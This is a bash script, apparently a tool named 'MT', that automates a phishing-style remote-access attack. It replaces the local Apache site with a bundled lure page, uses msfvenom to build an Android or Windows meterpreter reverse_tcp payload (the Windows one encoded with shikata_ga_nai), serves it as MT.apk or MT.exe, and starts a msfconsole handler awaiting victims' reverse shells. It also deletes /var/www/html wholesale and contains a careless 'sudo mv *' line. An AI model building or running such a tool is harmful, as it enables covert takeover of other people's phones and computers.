## Colors ##
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
############

## Menu ##
menu() {
echo "		${BLUE}
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@   @@@  @@@  
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  
		${BLUE}   @@!    @@!  @@@  @@!  @@@  @@!  !@@  
		${BLUE}   !@!    !@!  @!@  !@!  @!@  !@!  @!!  
		${BLUE}   @!!    @!@  !@!  @!@!!@!   @!@@!@!   
		${BLUE}   !!!    !@!  !!!  !!@!@!    !!@!!!    
		${BLUE}   !!:    !!:  !!!  !!: :!!   !!: :!!   
		${BLUE}   :!:    :!:  !:!  :!:  !:!  :!:  !:!  
		${BLUE}    ::    ::::: ::  ::   :::   ::  :::  
		${BLUE}    :      : :  :    :   : :   :   :::  
		${BLUE} "
echo "			  ${WHITE}WellCome ${RED}Turk <3"
echo "			
			
${WHITE}1) ${GREEN}Android ?
${WHITE}2) ${GREEN}Windows ?
${WHITE}3) ${GREEN}Update ?
${WHITE}4) ${GREEN}Info & Help ?
${WHITE}5) ${GREEN}Backup & Restore Apache ?
${WHITE}6) ${GREEN}EXit ?"
read -p "
${RED}[${WHITE}-${RED}]${WHITE} What's the num : ${GREEN}" q 
}
##########

## Varyabol ##
z=1
a=2
v=3
s=5
##############
{ clear; menu; echo; }
if [ $q = $z ];
then
clear

echo "		${BLUE}
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@   @@@  @@@  
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  
		${BLUE}   @@!    @@!  @@@  @@!  @@@  @@!  !@@  
		${BLUE}   !@!    !@!  @!@  !@!  @!@  !@!  @!!  
		${BLUE}   @!!    @!@  !@!  @!@!!@!   @!@@!@!   
		${BLUE}   !!!    !@!  !!!  !!@!@!    !!@!!!    
		${BLUE}   !!:    !!:  !!!  !!: :!!   !!: :!!   
		${BLUE}   :!:    :!:  !:!  :!:  !:!  :!:  !:!  
		${BLUE}    ::    ::::: ::  ::   :::   ::  :::  
		${BLUE}    :      : :  :    :   : :   :   :::  
		${BLUE} "
echo "			  ${WHITE}WellCome ${RED}Turk <3"
sleep 2
echo "			 ${GREEN}Opening Service </3"
sudo service apache2 start
sudo service postgresql start
echo "			${GREEN}The Service is Opened ^o^"
echo "		  ${RED}Please wait to change the site "
echo "${GREEN}		 	  Replaceing WebSite..."
sleep 2
read -p "${GREEN}[${RED}-${GREEN}]${WHITE} Do you want change Photo? (y/n) : ${GREEN}" er
if [ $er = y ]
then
clear
echo "		${BLUE}
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@   @@@  @@@  
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  
		${BLUE}   @@!    @@!  @@@  @@!  @@@  @@!  !@@  
		${BLUE}   !@!    !@!  @!@  !@!  @!@  !@!  @!!  
		${BLUE}   @!!    @!@  !@!  @!@!!@!   @!@@!@!   
		${BLUE}   !!!    !@!  !!!  !!@!@!    !!@!!!    
		${BLUE}   !!:    !!:  !!!  !!: :!!   !!: :!!   
		${BLUE}   :!:    :!:  !:!  :!:  !:!  :!:  !:!  
		${BLUE}    ::    ::::: ::  ::   :::   ::  :::  
		${BLUE}    :      : :  :    :   : :   :   :::  
		${BLUE} "
echo "			  ${WHITE}WellCome ${RED}Turk <3"
echo "

${GREEN}What's tha photo ?"
read -p "
${RED}[${WHITE}-${RED}]${GREEN} Type locattion of image : ${BLUE}" emagi
sudo mv $emagi html/Android/html/images/
sudo mv * pic01.jpg
elif [ $er = n ]
then
echo "Ok.."
else {
echo "${RED}Invaled Choose"
}
fi
sudo rm -rf /var/www/html
sudo cp html/Android/html /var/www/ -xr
echo "${RED}
 ____                   _ _ 
|  _ \  ___  _ __   ___| | |
| | | |/ _ \| '_ \ / _ \ | |
| |_| | (_) | | | |  __/_|_|
|____/ \___/|_| |_|\___(_|_)"
sleep 2
echo "${GREEN}			What's your${RED} IP${GREEN} ?"
echo "${GREEN} "
read -p "${RED}[${WHITE}-${RED}]${GREEN} Type your IP : ${BLUE}" z
echo "			${RED}Your link WebSite --> ${BLUE}http://$z ${RED}or ${BLUE}http://localhost ${RED}or ${BLUE}http://127.0.0.1"
sleep 2
echo "${GREEN}Dear... what's LHOST the Payload? (${RED}$z${GREEN})"
read -p "${RED}[${WHITE}-${RED}]${GREEN} Type LHOST: ${BLUE}" lhost
sleep 1
echo "${GREEN}Dear... what's LPORT the Payload? (${RED}4444${GREEN})"
read -p "${RED}[${WHITE}-${RED}]${GREEN} Type LPORT : ${BLUE}" lport
sleep 1
echo "${RED}Please wait to make Payload ^_^${GREEN}"
sudo msfvenom --platform android --arch dalvik -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport -o /var/www/html/MT.apk
echo "${GREEN}direct apk link --> ${RED}http://$z/MT.apk"
sleep 1
echo "${GREEN}THX to use ${RED}MT${GREEN} ^<^"
sleep 2
cd meterpreter
echo "open msf wait..."
msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD android/meterpreter/reverse_tcp; show options; run'
elif [ $q = $a ];
then
clear

echo "		${BLUE}
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@   @@@  @@@  
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  
		${BLUE}   @@!    @@!  @@@  @@!  @@@  @@!  !@@  
		${BLUE}   !@!    !@!  @!@  !@!  @!@  !@!  @!!  
		${BLUE}   @!!    @!@  !@!  @!@!!@!   @!@@!@!   
		${BLUE}   !!!    !@!  !!!  !!@!@!    !!@!!!    
		${BLUE}   !!:    !!:  !!!  !!: :!!   !!: :!!   
		${BLUE}   :!:    :!:  !:!  :!:  !:!  :!:  !:!  
		${BLUE}    ::    ::::: ::  ::   :::   ::  :::  
		${BLUE}    :      : :  :    :   : :   :   :::  
		${BLUE} "
echo "			  ${WHITE}WellCome ${RED}Turk <3"
sleep 2
echo "			 ${GREEN}Opening Service </3"
sudo service apache2 start
sudo service postgresql start
echo "			${GREEN}The Service is Opened ^o^"
echo "		  ${RED}Please wait to change the site "
echo "${GREEN}		 	  Replaceing WebSite..."
sleep 2
read -p "${GREEN}[${RED}-${GREEN}]${WHITE} Do you want change Photo? (y/n) : ${GREEN}" re
if [ $re = y ]
then
clear
echo "		${BLUE}
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@   @@@  @@@  
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  
		${BLUE}   @@!    @@!  @@@  @@!  @@@  @@!  !@@  
		${BLUE}   !@!    !@!  @!@  !@!  @!@  !@!  @!!  
		${BLUE}   @!!    @!@  !@!  @!@!!@!   @!@@!@!   
		${BLUE}   !!!    !@!  !!!  !!@!@!    !!@!!!    
		${BLUE}   !!:    !!:  !!!  !!: :!!   !!: :!!   
		${BLUE}   :!:    :!:  !:!  :!:  !:!  :!:  !:!  
		${BLUE}    ::    ::::: ::  ::   :::   ::  :::  
		${BLUE}    :      : :  :    :   : :   :   :::  
		${BLUE} "
echo "			  ${WHITE}WellCome ${RED}Turk <3"
echo "

${GREEN}What's tha photo ?"
read -p "
${RED}[${WHITE}-${RED}]${GREEN} Type locattion of image : ${BLUE}" emagi
sudo mv $emagi html/Windows/html/images
sudo mv * pic01.jpg
elif [ $re = n ]
then
echo "Ok.."
else {
echo "Invaled Choose"
}
fi
sudo rm -rf /var/www/html
sudo cp html/Windows/html /var/www/ -xr
echo "${RED}
 ____                   _ _ 
|  _ \  ___  _ __   ___| | |
| | | |/ _ \| '_ \ / _ \ | |
| |_| | (_) | | | |  __/_|_|
|____/ \___/|_| |_|\___(_|_)"
sleep 2
echo "${GREEN}			What's your${RED} IP${GREEN} ?"
echo "${GREEN} "
read -p "${RED}[${WHITE}-${RED}]${GREEN} Type your IP : ${BLUE}" z
echo "			${RED}Your link WebSite --> ${BLUE}http://$z ${RED}or ${BLUE}http://localhost ${RED}or ${BLUE}http://127.0.0.1"
sleep 2
echo "${GREEN}Dear... what's LHOST the Payload? (${RED}$z${GREEN})"
read -p "${RED}[${WHITE}-${RED}]${GREEN} Type LHOST : ${BLUE}" lhost
sleep 1
echo "${GREEN}Dear... what's LPORT the Payload? (${RED}4444${GREEN})"
read -p "${RED}[${WHITE}-${RED}]${GREEN} Type LPORT : ${BLUE}" lport
sleep 1
echo "${RED}Please wait to make Payload ^_^${GREEN}"
sudo msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$lport -e x86/shikata_ga_nai -o /var/www/html/MT.exe
echo "${GREEN}direct apk link --> ${RED}http://$z/MT.exe"
sleep 1
echo "${GREEN}THX to use ${RED}MT${GREEN} ^<^"
sleep 2
cd meterpreter
echo "open msf wait..."
msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD windows/meterpreter/reverse_tcp; show options; run'
elif [ $q = $v ];
then
cd ..
git clone http://github.com/MazenTurk201/MT
cd MT
chmod +x MT.sh
echo "${RED}
 ____                   _ _ 
|  _ \  ___  _ __   ___| | |
| | | |/ _ \| '_ \ / _ \ | |
| |_| | (_) | | | |  __/_|_|
|____/ \___/|_| |_|\___(_|_)"
exit
elif [ $q = 4 ];
then
clear
cat ReadME.md
{ menu; echo; }
elif [ $q = $s ];
then
clear

echo "		${BLUE}
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@   @@@  @@@  
		${BLUE} @@@@@@@  @@@  @@@  @@@@@@@@  @@@  @@@  
		${BLUE}   @@!    @@!  @@@  @@!  @@@  @@!  !@@  
		${BLUE}   !@!    !@!  @!@  !@!  @!@  !@!  @!!  
		${BLUE}   @!!    @!@  !@!  @!@!!@!   @!@@!@!   
		${BLUE}   !!!    !@!  !!!  !!@!@!    !!@!!!    
		${BLUE}   !!:    !!:  !!!  !!: :!!   !!: :!!   
		${BLUE}   :!:    :!:  !:!  :!:  !:!  :!:  !:!  
		${BLUE}    ::    ::::: ::  ::   :::   ::  :::  
		${BLUE}    :      : :  :    :   : :   :   :::  
		${BLUE} "
echo "			  ${WHITE}WellCome ${RED}Turk <3"
echo "${GREEN}What do you wont ?
	${WHITE}1) ${GREEN}BackUP		${WHITE}2) ${GREEN}Restore"
read -p "

${GREEN}[${RED}-${GREEN}]${WHITE} type your Option : ${GREEN}" u
if [ $u = 1 ];
then
sudo cp -xr /var/www/html BackUP
echo "${RED}
 ____                   _ _ 
|  _ \  ___  _ __   ___| | |
| | | |/ _ \| '_ \ / _ \ | |
| |_| | (_) | | | |  __/_|_|
|____/ \___/|_| |_|\___(_|_)"
sleep 1
./MT.sh
elif [ $u = 2 ];
then
sudo cp -xr BackUP/html /var/www/
echo "${RED}
 ____                   _ _ 
|  _ \  ___  _ __   ___| | |
| | | |/ _ \| '_ \ / _ \ | |
| |_| | (_) | | | |  __/_|_|
|____/ \___/|_| |_|\___(_|_)"
sleep 1
./MT.sh
else {
echo "${RED}Invaled Number.."
}
fi
elif [ $q = 6 ];
then
echo "${WHITE}TNX for useing MT ${RED}<3"
exit
else {
echo "${RED}Invaled Number.."
}
fi
